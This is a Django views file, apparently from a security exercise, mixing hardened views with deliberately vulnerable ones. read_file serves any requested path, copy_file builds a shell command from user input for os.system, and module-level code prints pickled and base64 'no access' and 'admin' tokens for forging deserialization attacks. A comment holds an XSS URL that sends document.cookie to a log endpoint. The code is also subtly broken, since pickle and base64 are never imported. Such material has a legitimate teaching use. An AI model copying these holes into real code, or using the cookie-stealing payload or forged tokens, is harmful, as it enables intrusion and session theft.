import json
import os
import logging
from pathlib import Path
from typing import Optional
from dataclasses import dataclass

from django.http import HttpResponse, JsonResponse
from django.shortcuts import get_object_or_404
from django.core.exceptions import ValidationError
from django.utils.html import escape
from django.conf import settings
from django.contrib.auth.decorators import login_required
import jwt

from security.models import User

logger = logging.getLogger(__name__)


from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_protect

@require_http_methods(["GET"])
@csrf_protect
def get_user(request, user_id):
    """Secure user retrieval using Django ORM
    
    Args:
        request: HTTP request object
        user_id: User ID to retrieve
        
    Returns:
        JsonResponse with user data or error message
        
    Security:
        - Restricted to GET method only
        - CSRF protection enabled
        - Input validation
        - Error logging
    """
    if request.method != 'GET':
        logger.warning(f"Unauthorized method {request.method} attempted for user {user_id}")
        return JsonResponse({'error': 'Method not allowed'}, status=405)
        
    try:
        # Validate user_id is positive integer
        if not isinstance(user_id, int) or user_id < 1:
            raise ValueError("Invalid user ID format")
            
        user = get_object_or_404(User, id=user_id)
        
        # Log successful access
        logger.info(f"User {user_id} retrieved successfully")
        
        return JsonResponse({
            'id': user.id,
            'name': user.name
        })
    except ValueError as e:
        logger.warning(f"Invalid user ID attempted: {user_id}")
        return JsonResponse({'error': str(e)}, status=400)
    except Exception as e:
        logger.error(f"Error retrieving user: {str(e)}")
        return JsonResponse({'error': 'Internal server error'}, status=500)


def read_file(request, filename):
    with open(filename) as f:
        return HttpResponse(f.read())


def copy_file(request, filename):
    """Copy a file in a very dangerous way"""

    cmd = f'cp {filename} new_{filename}'

    os.system(cmd)

    return HttpResponse("All good, don't worry about a thing :>")


@dataclass
class TestUser:
    """Dummy user data"""

    perms: int = 0


pickled_user = pickle.dumps(TestUser())
print(pickled_user)
encoded_user = base64.b64encode(pickled_user)
print(encoded_user)


# No access token:
# b'\x80\x03csecurity.views\nTestUser\nq\x00)\x81q\x01}q\x02X\x05\x00\x00\x00permsq\x03K\x00sb.'
# b'gANjc2VjdXJpdHkudmlld3MKVGVzdFVzZXIKcQApgXEBfXECWAUAAABwZXJtc3EDSwBzYi4='


# Admin token:
# b'\x80\x03csecurity.views\nTestUser\nq\x00)\x81q\x01}q\x02X\x05\x00\x00\x00permsq\x03K\x01sb.'
# b'gANjc2VjdXJpdHkudmlld3MKVGVzdFVzZXIKcQApgXEBfXECWAUAAABwZXJtc3EDSwFzYi4='

@login_required
def admin_index(request):
    """Protected admin page using JWT authentication"""
    try:
        token = request.COOKIES.get('admin_token')
        if not token:
            logger.warning(f"Admin access attempted without token from IP: {request.META.get('REMOTE_ADDR')}")
            return JsonResponse({'error': 'No token provided'}, status=401)
            
        payload = jwt.decode(
            token, 
            settings.SECRET_KEY,
            algorithms=['HS256']
        )
        
        if payload.get('role') != 'admin':
            logger.warning(f"Non-admin access attempted with token from IP: {request.META.get('REMOTE_ADDR')}")
            return JsonResponse({'error': 'Insufficient permissions'}, status=403)
            
        return JsonResponse({'message': 'Hello Admin'})
    except jwt.InvalidTokenError:
        logger.error(f"Invalid admin token attempted from IP: {request.META.get('REMOTE_ADDR')}")
        return JsonResponse({'error': 'Invalid token'}, status=401)
    except Exception as e:
        logger.error(f"Admin access error: {str(e)}")
        return JsonResponse({'error': 'Internal server error'}, status=500)


# http://127.0.0.1:8000/security/search?query=%3Cscript%3Enew%20Image().src=%22http://127.0.0.1:8000/security/log?string=%22.concat(document.cookie)%3C/script%3E
@dataclass
class SearchParams:
    query: str
    
    def validate(self) -> None:
        if not self.query:
            raise ValidationError("Search query cannot be empty")
        if len(self.query) > 100:
            raise ValidationError("Search query too long")
        if any(char in self.query for char in '<>{}'):
            raise ValidationError("Invalid characters in search query")

def search(request):
    """Secure search functionality with input validation"""
    try:
        params = SearchParams(query=request.GET.get('query', ''))
        params.validate()
        
        safe_query = escape(params.query)
        logger.info(f"Search performed with query: {safe_query}")
        
        return JsonResponse({
            'query': safe_query,
            'results': []  # Implementar lógica de busca aqui
        })
    except ValidationError as e:
        logger.warning(f"Invalid search query attempted: {str(e)}")
        return JsonResponse({'error': str(e)}, status=400)
    except Exception as e:
        logger.error(f"Search error: {str(e)}")
        return JsonResponse({'error': 'Internal server error'}, status=500)

def log(request):
    """Secure logging functionality"""
    try:
        string = request.GET.get('string', '')
        if len(string) > 200:
            raise ValidationError("Log string too long")
            
        safe_string = escape(string)
        logger.info(f"Log entry: {safe_string}")
        
        return JsonResponse({'status': 'logged'})
    except ValidationError as e:
        logger.warning(f"Invalid log attempt: {str(e)}")
        return JsonResponse({'error': str(e)}, status=400)
    except Exception as e:
        logger.error(f"Logging error: {str(e)}")
        return JsonResponse({'error': 'Internal server error'}, status=500)
